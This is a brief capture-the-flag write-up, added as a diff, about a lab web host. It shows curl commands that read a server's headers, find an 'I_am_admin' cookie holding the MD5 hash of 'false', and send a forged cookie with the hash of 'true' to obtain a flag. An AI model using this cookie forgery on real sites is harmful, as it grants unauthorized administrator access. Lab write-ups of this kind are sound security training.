@@ -1,0 +1,8 @@
+Inspecting header using command:
+$ curl -I  http://10.11.200.225 
+
+We noted a Set-Cookie named I_am_admin. The cookie itself is a MD5 encrypted information which once decrypted translates in "false", we changed it to "true" encrypted it and passsed it via curl command:
+
+$ curl -b I_am_admin=b326b5062b2f0e69046810717534cb09  http://10.11.200.225/  | grep "Flag"
+
+and obtained another flag.
